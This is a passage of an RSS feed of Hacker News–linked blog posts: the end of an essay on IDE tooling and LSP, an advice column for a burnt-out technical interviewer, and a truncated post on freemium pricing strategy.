Most of rust-analyzer was written using pretty spartan IDE support.
There are a lot of insanely-productive folks who are like “sometimes I type vim, sometimes I type vi, they are sufficiently similar”.
Regex-based syntax highlighting and regex based fuzzy symbol search (<a href="https://github.com/universal-ctags/ctags">ctags</a>) get you a really long way.</p>
<p>However, I do believe that features unlocked by deep understanding of the language help.
The funniest example here is extend/shrink selection.
This features allows you to extend current selection to the next encompassing syntactic construct.
It’s the simplest feature a PostIntelliJ IDE can have, it only needs the parser.
But it is sooo helpful when writing code, it just completely blows vim’s text objects out of the water, especially when combined with multiple cursors.
In a sense, this is structural editing which works for text.</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98809232-80e3db00-241d-11eb-883a-5aece9a1dbfc.gif" alt="98809232 80e3db00 241d 11eb 883a 5aece9a1dbfc">
</p>
</div>
<p>If you add further knowledge of the language into a mix, you’ll get the “assists” system: micro-refactoring which available in a particular context.
For example, is the cursor is on a comma in a list of function arguments, you can <span><kbd>alt</kbd>+<kbd>enter</kbd></span> &gt; “swap arguments”, and the order of arguments will be changed in the declaration and on various call-sites as well.
(See <a href="https://rust-analyzer.github.io/blog/2020/09/28/how-to-make-a-light-bulb.html">this post</a> to learn how assists are implemented).</p>
<p>These small dwim things add up to a really nice editing experience, where you mostly express the intention, and the IDE deals with boring syntactical aspects of code editing:</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98812121-37e25580-2422-11eb-8541-2c5a32926845.gif" alt="98812121 37e25580 2422 11eb 8541 2c5a32926845">
</p>
</div>
<p>For larger projects, complex refactors are a huge time-saver.
Doing project-wide renames and signature changes automatically and without thinking reduces the cost of keeping the code clean.</p>
<p>Another transformative experience is navigation.
In IntelliJ, you generally don’t “open a file”.
Instead you think directly in terms of functions, types and modules, and navigate to those using file structure, goto symbol, to do definition/implementation/type, etc:</p>

<p>When I used Emacs, I really admired its buffer management facilities, because they made opening a file I want a breeze.
When I later switched to IntelliJ, I stopped thinking in terms of a set of opened files altogether.
I disabled editor tabs and started using editor splits less often — you don’t need bookmarks if you can just find things.</p>
<p>For me, there’s one aspect of traditional editors which is typically not matched in IDEs out of the box — basic cursor motion.
Using arrow keys for that is slow and flow-breaking, because one needs to move the hand from the home row.
Even Emacs' horrific <kbd>C-p</kbd>, <kbd>C-n</kbd> are a big improvement, and vim’s <kbd>hjkl</kbd> go even further.
One fix here is to configure each tool to use your favorite shortcuts, but this is a whack-a-mole game.
What I do is remapping <kbd>CapsLock</kbd> to act as an extra modifier, such that <kbd>ijkl</kbd> <strong>are</strong> arrow keys.
(There are also keyboards with <a href="https://ultimatehackingkeyboard.com/">hardware</a> <a href="https://ergodox-ez.com/">support</a> for this).
This works in all applications the same way.
Easy motion / ace jump functionality for jumping to any visible character is also handy, and usually is available <a href="https://plugins.jetbrains.com/plugin/9803-acejump-lite">via</a> <a href="https://marketplace.visualstudio.com/items?itemName=lucax88x.codeacejumper">a plugin</a>.</p>
<p>Recent advancements with LSP protocol promise to give one the best of both worlds, where semantic-aware backend and light-weight editor frontend are different processes, which can be mixed and matched.
This is nice in theory, but not as nice in practice as IntelliJ yet, mostly because IntelliJ is way more polished.</p>
<p>To give a simple example, in IntelliJ for “go to symbol by fuzzy name” functionality, I can filter the search scope by:</p>
<div>
<ul>
<li>
<p>is this my code/code from a dependency?</p>
</li>
<li>
<p>is this test/production code?</p>
</li>
<li>
<p>is a symbol a type-like thing, or a method-like thing?</p>
</li>
<li>
<p>path to the module where the symbol is defined.</p>
</li>
</ul>
</div>
<p>VS Code and LSP simply do not have capabilities for such filters yet, they have to be bolted on using hacks.
Support for LSP in other editors is even more hit-and-miss.</p>
<p>LSP did achieve a significant breakthrough — it made people care about implementing IDE backends.
Experience shows that re-engineering an existing compiler to power an IDE is often impossible, or isomorphic to a rewrite.
How a compiler talks to an editor is the smaller problem.
The hard one is building a compiler that can do IDE stuff in the first place.
Check out <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">this post</a> for some of the technical details.
Starting with this use-case in mind saves a lot of effort down the road.</p>
<p>This I think is a big deal.
I hypothesize that the reason why IDEs do not completely dominate tooling landscape is the lack of good IDE backends.</p>
<p>If we look at the set of languages fairly popular recently, a significant fraction of them is dynamically typed: PHP, JavaScript, Python, Ruby.
The helpfulness of an IDE for dynamically typed languages is severely limited: while approximations and heuristics can get you a long way, you still need humans in the loop to verify IDE’s guesses.</p>
<p>There’s C++, but its templates are effectively dynamically typed, with exactly the same issues (and a very complex base language to boot).
Curiously, C looks like a language for which implementing a near-perfect IDE is pretty feasible.
I don’t know why it didn’t happen before CLion.</p>
<p>This leaves C# and Java.
Indeed, these languages are dominated by IDEs.
There’s a saying that you can’t write Java without an IDE.
I think it gets the causation direction backwards: Java is one of the few languages for which it is possible to implement a great IDE without great pain.
Supporting evidence here is Go.
According to <a href="https://blog.golang.org/survey2019-results#TOC_5.">survey results</a>, text editors are stably declining in popularity in favor of IDEs.</p>
<p>I think this is because Go actually has good IDEs.
This is possible because the language is sufficiently statically typed for an IDE to be a marked improvement.
Additionally, the language is very simple, so the amount of work you need to put in to make a decent IDE is much lower than for other languages.
If you have something like JavaScript…​
Well, you first need to build an alternative language for which you can actually implement an IDE (<a href="https://www.typescriptlang.org/">TypeScript</a>) and only then you can build the IDE itself (<a href="https://github.com/microsoft/vscode">VS Code</a>).</p>
</article>

  </div></div>]]>
            </description>
            <link>https://matklad.github.io/2020/11/11/yde.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26060145</guid>
            <pubDate>Mon, 08 Feb 2021 02:27:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I'm an interviewer at my company and burnt out]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 85 (<a href="https://news.ycombinator.com/item?id=26060099">thread link</a>) | @mooreds
<br/>
February 7, 2021 | https://dear.mariechatfield.com/interviewer-burn-out/ | <a href="https://web.archive.org/web/*/https://dear.mariechatfield.com/interviewer-burn-out/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote>
<p>Dear Marie,</p>
<p>I am one of a handful of women engineers at my company and I have been interviewing 1-2 candidates per week for the past several months. Since I started interviewing, we have only hired white or Asian men.</p>
<p>Bringing in underrepresented identities to my workplace is important to me, and leadership at my company constantly says they value ‘Diversity and Inclusion’. I’ve offered ideas on how to attract a wider group of candidates, but I don’t feel like I am heard or taken seriously. I’m exhausted being part of the interview team with the results we have. At this point, I only want to interview underrepresented candidates, but that seems inappropriate to ask for.</p>
<p>Am I complicit in a racist, sexist system? How can I push for change and preserve my energy?</p>
</blockquote>
<!-- question -->

<p>Hey there,</p>
<p>Interviewing one or two candidates per week for months sounds absolutely exhausting. It’s no wonder that you’re tired and burnt out—especially if it seems like your company isn’t actually hiring anyone outside their established pattern, despite their avowed dedication to diversity and inclusion.</p>
<p><strong>I have found conducting interviews to be difficult and energy-consuming work, particularly if you are invested in treating candidates equitably and with empathy.</strong> It’s not just that the hour-long calendar block in the middle of the day, it’s also:</p>
<ul>
<li>preparing for the interview ahead of time, making sure you have all the resources you need and your environment is set up.</li>
<li>being deeply focused during the interview, paying attention to the smallest of interactions to discern signals (of varying reliability) about a person’s areas of technical expertise and approach to work and collaboration.</li>
<li>responding to candidates on the fly, figuring out the right balance of giving them a hint when they’re stuck and seeing how they solve a problem themselves, and ensuring they have an excellent experience with your company.</li>
<li>writing up feedback afterwards and deliberating your evaluation and whether you’ve let unconscious bias influence you and if your feedback is well-calibrated with the rest of the hiring group so that you’re not consistently scoring everyone higher or lower than the average.</li>
<li>participating in decisions and conversations around interviewing as a whole, and how to make it more equitable and inclusive.</li>
</ul>
<p>It sounds like you aren’t hiring specifically for roles on your immediate team, but rather part of a group of interviewers who support hiring across the whole company. This structure makes sense for larger organizations who have a steady stream of open roles. If everyone helps out a little bit all the time, then no one team’s productivity is completely sunk when they need to hire.</p>
<p>The downside, of course, is that the hiring never really stops. <strong>You don’t get to celebrate by welcoming your new teammate; you just keep interviewing. And interviewing. And interviewing.</strong></p>
<p>At one company, I completed over 100 technical interviews in about two years. I had prided myself on being a very good interviewer, in part because of all the practice. By the end, I was completely miserable and I hated everything about it. I couldn’t convince myself to care about candidates anymore and I was having trouble focusing and giving them my full attention. So, I stopped interviewing. And it was <em>such</em> a relief. It wasn’t even necessarily the time back that I cared about; it was <strong>letting go of the immense responsibility of contributing to hiring decisions, but with so little authority to change anything.</strong></p>
<p>Consider a few of these options, and what each one feels like:</p>
<ul>
<li>What if you reduced your availability to one interview a week?</li>
<li>What if you reduced your availability to two interviews a month?</li>
<li>What if you stopped interviewing for a month?</li>
<li>What if you stopped interviewing for a quarter?</li>
</ul>
<p><strong>Did you feel a sense of relief or joy when you imagined those? Which ones feels the most like what you need right now?</strong></p>
<p>You say that you’ve offered ideas about how to improve your hiring practices and that you <em>“don’t feel like I am heard or taken seriously.”</em> I am guessing that you are not a manager, or any other person who makes the final call on hiring decisions. If you were, my advice would be very different<sup id="fnref-1"><a href="#fn-1">1</a></sup>.</p>
<p>But if I’m right, your main job responsibility is probably to write, release, and maintain software—<em>not</em> to build a team or manage their collective effectiveness. A manager <em>must</em> hire at some point if they want to ensure their team has the right balance of expertise and experience. You probably help out managers at your company by giving them quality feedback about the people they are considering hiring; but it’s unlikely that your annual evaluation centers on your participation in the hiring process or the hiring outcomes at your company.</p>
<p>So… take a break. Don’t stop entirely or forever; you are doing the important work of advocating for inclusion and equity, I would hate for you to give that up entirely. But it sounds like what you’re doing now isn’t working the way you had hoped, and you’re too tired to imagine a bigger and bolder approach right now.</p>
<p><strong>I have quipped that my main career goal is to do such outstanding work that I can be a complete and total pain in the ass about the things that truly matter, like accessibility and inclusion and equity.</strong> That doesn’t mean that I’m waiting until I’ve “arrived” to advocate for what I know is right and to put my privilege to use. It means that I don’t waste my battles on inconsequential things and I try to make myself valuable enough that I’m harder to push out when I do dig in my heels.</p>
<p>But in order to spend social capital, you have to build it up first—and for you, that might mean giving up interviewing for a bit, focusing on your main job responsibility and building relationships with your coworkers, then coming back with a fresh perspective, renewed energy, and a group of like-minded peers with a common goal of improving the hiring process.</p>
<p>Assuming that you don’t have the authority to make a hire/no-hire decision or to revamp your recruiting process, you’re a bit limited in what you can do on your own. <strong>But there is strength in numbers, and it’s harder to ignore a group.</strong> See if you can find or organize a few people who <em>also</em> care about diversity and inclusion in recruiting and hiring. It doesn’t have to be anything formal<sup id="fnref-2"><a href="#fn-2">2</a></sup>, it can just be three people who all +1 each other’s ideas and bring up the same important questions again and again.</p>
<p><strong>You also asked: <em>“Am I complicit in a racist, sexist system?”</em> I’m not sure that I can answer that one for you.</strong> You know your situation much better than I do; if that’s a concern that keeps coming up for you, sit with it. It may be that there’s something you need to do that you haven’t yet.</p>
<p>I think you would definitely be complicit if you stopped raising concerns about inclusion entirely; if you ignored or minimized the concerns raised by other marginalized people because it makes you feel uncomfortable about your own choices or privilege; or if you had the authority to make a change for the better and you didn’t use it.</p>
<p><strong>If you do come to the conclusion that you have not been living up to your values and have instead prioritized your comfort or advancement over the equity of all—welcome to the club.</strong> We mess up a lot, and we learn with empathy and gratitude for the people who corrected us. That’s another benefit to finding some peers who can advocate alongside you—you’ll each have areas of insight the others won’t and you can teach each other.</p>
<p>I hope that you’re able to take a break from interviewing. I hope that when you’re ready to resume, it’s because you’re genuinely excited to have some influence over hiring at your company and you feel equipped to push for practices that you know are worthwhile<sup id="fnref-3"><a href="#fn-3">3</a></sup>. I hope you find support from other engineers who care about inclusion. I hope your company figures out a way to stop using whatever metrics they love that so consistently undervalue Black and Indigenous people, Hispanic/Latinx people, women and people with other minoritized genders, disabled people, LGTBQ+ people, and those who span more than one of those communities.</p>
<p>In short: I hope you get good rest, and that rest fuels you for another round. There is much work to be done. Let’s do it together. 💖</p>
<p>With so much warmth,<br>
Marie</p>
</div></div>]]>
            </description>
            <link>https://dear.mariechatfield.com/interviewer-burn-out/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26060099</guid>
            <pubDate>Mon, 08 Feb 2021 02:16:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Kill a Unicorn]]>
            </title>
            <description>
<![CDATA[
Score 264 | Comments 82 (<a href="https://news.ycombinator.com/item?id=26060038">thread link</a>) | @chrisfrantz
<br/>
February 7, 2021 | https://www.chrisfrantz.com/how-to-kill-a-unicorn/ | <a href="https://web.archive.org/web/*/https://www.chrisfrantz.com/how-to-kill-a-unicorn/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-179"><div><p>I took a deep dive on freemium pricing and decided to document it in this post. Why freemium? I think it's how the little guys can win against market leaders.</p><p>Basically, it's how you kill a unicorn.</p><p>Notion, Figma, Canva, Mailchimp, and Segment. What do all of these platforms have in common, besides being category leaders? Each one has unseated the previous category leaders with less money and smaller teams. Each has also opted for a product led growth strategy that is fueled by product virality and an innovative pricing strategy.</p><p>But let's back up. How did we get here?</p><p>The year is 2012 and the preeminent name in design isn't Sketch or Figma - it's Adobe. 2012 era Adobe is a much different beast to where we are now. There was no real SaaS model and licenses were hundreds of dollars each, locked to a machine, and didn't get upgrades. Still, Adobe is unequivocally the category leader. But in just a few years, that would all change due to an enterprising young entrepreneur and her new business model.</p><p>Canva launched in 2012 and spread like wildfire. In 3 years, the company was able to accumulate accumulated 10 million users, with almost 1 million coming in the first year alone. By the next year, they had 17 thousand videos about their product.</p><p>This kind of fervent user adoption is the stuff of legend. I started hearing about Canva around that time. My then-girlfriend (now wife) had put together a project and it looked much better than anything I could knock out in Photoshop or Illustrator. She mentioned it was not only really easy to use, but it was free! At the time I think I was still bouncing from Adobe license to Adobe license, each of which was half a month's rent, so I was blown away.</p><p>Then I started seeing it everywhere. It was being used for school projects, large advertising campaigns, and was the first recommendation in online groups whenever someone needed a design tool.</p><p>That space used to be occupied by Adobe, but in a matter of a few years, they were being overtaken in the B2C and even a bit in the B2B space by a brand new company with a limited amount of funding.</p><figure><img width="1024" height="570" src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png" alt="" srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-768x427.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1.png 1215w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png" data-srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-768x427.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1.png 1215w"></figure><figure><img width="1024" height="572" src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png" alt="" srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-768x429.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2.png 1227w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png" data-srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-768x429.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2.png 1227w"></figure><p>Meanwhile, another company, Sketch, was eating away at their market share by offering design-focused tools for modern internet companies. Adobe had Photoshop and Illustrator, neither of which was purpose-built for the internet and both of which were expensive af. Adobe XD wasn't quite production-ready at that point, so Sketch was able to make inroads by offering a lower-priced license for its software.</p><p>Out of left-field comes the Canva of professional design tools: Figma.</p><figure><img width="1024" height="565" src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png" alt="" srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-300x165.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-768x423.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png" data-srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-300x165.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-768x423.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3.png 1255w"></figure><p>Figma quickly overtakes Sketch by offering a few unique features and an unbeatable pricing model. Freemium, with a twist.</p><p>Figma, like Canva before it, quickly discovered the power that a free product with shareable outputs offers. Users create content with the tool, share the content and then inevitably get asked how it was made. Of course, the user is both happy to share and give a positive recommendation since the output content is being appreciated, and the platform gains another user.</p><p>A couple points to understand about the shiny world of marketing:</p><ul><li>Recommendations from trusted people always lead to higher conversion rates. It's easy to recommend free things since the only exchange is time.</li><li>Backlinks are everything, still. Google hasn't cracked how to build page authority without backlinks and having them everywhere, attached with positive recommendations and high user dwell time once a user clicks a link, is seen as a positive signal.</li><li>Creating content in the app means content can be shared outside the app. That's a simple growth mechanism that can be leveraged mightily once a certain user volume has been hit.</li><li>Finally, email is the best marketing channel still. Freemium platforms exchange email addresses for access and make lead generation a snap.</li></ul><p>So Adobe now is taking fire from all sides and they eventually pivot to a cloud-based subscription model while also focusing all their efforts upmarket on the professional landscape, effectively ceding their B2C audience to Canva.</p><p><em>Quick note: There are many other factors that go into making a platform successful, from the founder to tech to the support. Pricing is just one of the pieces.</em></p><h2><strong>How Freemium really works</strong></h2><p>The common misconception with freemium is that it’s an easy way to not generate any revenue. How many stories have you heard about independent projects that have been worked on for years, only to launch with only a few dollars in revenue, followed by months of slogging before eventually shutting down. That’s very likely&nbsp;<em>not</em>&nbsp;a pricing problem, but a positioning problem. You need to position your product in front of the right audiences and the price becomes a natural fit for your expansion strategy.</p><p>In reality, there are a number of different ingredients in the recipe you need to nail before you can actually execute a freemium strategy effectively. You don’t need a team of hundreds of people, but it does help to lay out the strategy ahead of time.</p><p>Let's break out the different factors involved in setting up a freemium plan.</p><ul><li>Pricing that scales with usage</li><li>Shareable content</li><li>In-app upsells</li><li>Massive market opportunity</li><li>Pricing innovation on the primary value</li></ul><p>First, if you are missing even one of these, it might not be the pricing strategy for you. Each part is key in building out a converting freemium funnel.</p><p><strong>Pricing that scales with usage</strong></p><p>If a user wants to dip a toe in and play around with your platform, they can do that at zero cost (outside of an email address). That’s the basic premise of a freemium plan, but what happens when a user is converted and wants to expand their usage?</p><p>Your pricing should accommodate that natural urge and your product should gracefully allow them to expand their usage with as few barriers as possible.</p><p><strong>In-app upsells aka feature gating</strong></p><p>You need to rope off some of your app so there’s a reason to pay! However, you should charge based on either&nbsp;<strong>secondary user value or</strong>&nbsp;expanding the primary user value, but ideally both.</p><p>Let me explain. Google Analytics made analytics free and accessible to everyone. They charge based on primary user value, but only if you want to expand to a much higher tier of usage. For 99% of people, it will always be free.</p><p>That’s great, but really they only offer expanding their primary user value (analytics) as an upsell. Profitwell, one of my favorite companies utilizing this technique, charges entirely on secondary user value. They offer Profitwell Retain, a dunning service, on top of their analytics. Analytics are totally free. After all, you already have all your financial information integrated into it and onboarded your team.</p><p>Canva however offers all that and more. They let users expand their primary usage through additional templates, but also access other tools like scheduling posts on social media once you upgrade. Why pay 12K a year for Hootsuite when you can just upgrade Canva?</p><figure><img width="1024" height="673" src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1024x673.jpg" alt="" srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1024x673.jpg 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-300x197.jpg 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-768x505.jpg 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1536x1009.jpg 1536w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-2048x1346.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1024x673.jpg" data-srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1024x673.jpg 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-300x197.jpg 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-768x505.jpg 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-1536x1009.jpg 1536w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled4-2048x1346.jpg 2048w"></figure><p>With each of these product incentives, users are motioned into the next stage of the tool.</p><p><strong>Shareable content</strong></p><p>This could be considered a growth loop, since we’re building in some type of publishing into the platform so users can share links. Our goal with shareable content is to increase the k factor of a user, effectively turning a free user into a marketing machine. Every time they create content in the app and share it externally, you have another potential opportunity for user acquisition which helps balance out the slightly lower conversion rate you’ll see with a freemium plan.</p><p>You can do this with reports, tables, images, videos, etc. If it can be shared inside a team, you should enable it to be published from your platform.</p><p><strong>Massive Market Opportunity</strong></p><p>Freemium works best when you can boil the ocean. No really, let it rip. The ocean should be a massive existing user base or the early signs of a large user base. You will need the volume to make it work with freemium pricing. Here are the TAMs for a few of the examples.</p><ul><li>Canva: Anyone that needs to create images.</li><li>Profitwell: Anyone that wants to know their businesses metrics</li><li>Google Optimize: Anyone that wants to test anything on their site.</li><li>Microsoft Teams: Anyone that uses Slack. 😉</li></ul><p>Each of these audience segments is huge and represents uniquely large opportunities. Freemium pricing becomes much more difficult to pull off once you have to compete for a small audience with specific needs. You want to create a product that will work with 90% of users.</p><p><strong>Pricing Innovation on Primary Value</strong></p><p>What does this mean?</p><p>A competitive advantage that can’t be innovated against. This is the most important point. How does Slack compete with Teams when users have Teams included in their subscription? How does Baremetrics compete with Profitwell when most of what Baremetrics offered is free with Profitwell?</p><p>Well...they don’t. Baremetrics sold. Slack sold. You can’t compete against freemium when you’re able to offer the primary value for free. The existing market leaders can’t match your pricing without giving up millions in recurring revenue and they’re not going to do that.</p><p>That’s how you beat Adobe or fill-in-the-blank industry behemoth.</p><p>Create a great competitor (the hardest part), offer the primary value for free, then monetize on expanding that primary value or offer a secondary value.</p><h2><strong>I want to be free</strong></h2><p>So I'm putting my money where my mouth is. I'm switching over all my projects to freemium.</p><p>As of today:</p><ul><li><a href="http://snazzy.ai/">Snazzy.ai</a>, content marketing powered by GPT-3, now has a free tier</li><li><a href="http://ga-insights.com/">GA-Insights.com</a>, all your ad networks into Slack, has a free tier being built out</li><li><a href="http://weld.ai/">Weld.ai</a>, in beta as a Supermetrics alternative, will now be completely free at launch.</li></ul><p>The riskiest part of a freemium pricing tier as a bootstrapped founder is getting the volume you need to make up any initial drop in conversion rate.</p><h2><strong>Reference: The market leaders (and the victims)</strong></h2><ul><li>Profitwell: Baremetrics, Chartmogul</li><li>Canva: Photoshop, Illustrator, Word</li><li>Google Optimize: Optimizely, VWO</li><li>Microsoft Teams: Slack</li><li>Figma: Photoshop, Illustrator, Sketch Invision</li></ul><p>Early …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.chrisfrantz.com/how-to-kill-a-unicorn/">https://www.chrisfrantz.com/how-to-kill-a-unicorn/</a></em></p>]]>
            </description>
            <link>https://www.chrisfrantz.com/how-to-kill-a-unicorn/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26060038</guid>
            <pubDate>Mon, 08 Feb 2021 02:03:23 GMT</pubDate>
        </item>
    </channel>
</rss>
